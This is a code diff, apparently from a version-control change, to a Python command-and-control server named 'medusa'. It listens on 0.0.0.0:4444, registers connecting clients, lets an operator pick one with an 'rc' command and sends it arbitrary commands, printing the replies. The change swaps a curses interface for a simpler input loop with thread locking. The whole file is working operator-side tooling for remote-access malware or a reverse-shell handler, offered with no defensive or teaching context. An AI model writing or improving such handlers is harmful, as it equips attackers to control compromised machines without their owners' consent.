@@ -1,66 +1,70 @@
 import socket
 import threading
-import curses
-import os
-import base64
-import json
 
 clients = {}
-current_client = None
+lock = threading.Lock()
+current_client_id = None
 
-def send_command(client_socket, command):
-    client_socket.sendall(command.encode())
-
-def handle_client(client_socket, addr):
-    global current_client
-    clients[addr] = client_socket
-    if not current_client:
-        current_client = addr
+def handle_client(conn, addr, client_id):
+    print(f"[+] {client_id} connected from {addr}")
+    conn.send(b'Connected to medusa\n')
     while True:
         try:
-            data = client_socket.recv(4096)
+            data = conn.recv(4096)
             if not data:
                 break
-            print(f"\n[From {addr}]: {data.decode()}")
+            print(f"[{client_id}] {data.decode(errors='ignore')}")
         except:
             break
-    client_socket.close()
-    del clients[addr]
+    with lock:
+        del clients[client_id]
+    conn.close()
+    print(f"[-] {client_id} disconnected")
 
-def client_listener():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(('0.0.0.0', 9999))
-    server.listen(5)
-    print("[*] Waiting for connections...")
+def accept_connections(server):
+    client_counter = 0
     while True:
-        client_socket, addr = server.accept()
-        print(f"[+] Client connected: {addr}")
-        threading.Thread(target=handle_client, args=(client_socket, addr)).start()
+        conn, addr = server.accept()
+        with lock:
+            client_id = f"Client{client_counter}"
+            clients[client_id] = conn
+            client_counter += 1
+        threading.Thread(target=handle_client, args=(conn, addr, client_id), daemon=True).start()
 
-def command_loop(stdscr):
-    global current_client
-    stdscr.clear()
+def command_loop():
+    global current_client_id
     while True:
-        stdscr.addstr(0, 0, f"Connected Clients: {list(clients.keys())}")
-        stdscr.addstr(1, 0, f"Current: {current_client}")
-        stdscr.addstr(2, 0, "Command > ")
-        stdscr.refresh()
-        cmd = stdscr.getstr(3, 0).decode().strip()
-        stdscr.clear()
-
-        if cmd == "rc":
-            stdscr.addstr(0, 0, "Available Clients:")
-            for idx, client in enumerate(clients.keys()):
-                stdscr.addstr(idx + 1, 0, f"{idx + 1}. {client}")
-            stdscr.addstr(len(clients) + 2, 0, "Select > ")
-            idx = int(stdscr.getstr(len(clients) + 3, 0)) - 1
-            current_client = list(clients.keys())[idx]
-        else:
-            if current_client:
-                send_command(clients[current_client], cmd)
+        cmd = input("tv> ").strip()
+        if cmd.startswith("rc"):
+            print("Available clients:")
+            for cid in clients:
+                print(f" - {cid}")
+            target = input("Select client: ").strip()
+            if target in clients:
+                current_client_id = target
+                print(f"Now controlling: {current_client_id}")
             else:
-                stdscr.addstr(0, 0, "No client selected!")
+                print("Invalid client ID.")
+        elif current_client_id and current_client_id in clients:
+            if cmd == "exit":
+                current_client_id = None
+            else:
+                try:
+                    clients[current_client_id].send(cmd.encode())
+                except:
+                    print("Failed to send command.")
+        else:
+            print("No client selected. Use 'rc'.")
+
+def main():
+    host = "0.0.0.0"
+    port = 4444
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((host, port))
+    server.listen()
+    print(f"[+] Server listening on {host}:{port}")
+    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
+    command_loop()
 
 if __name__ == "__main__":
-    threading.Thread(target=client_listener, daemon=True).start()
-    curses.wrapper(command_loop)
+    main()
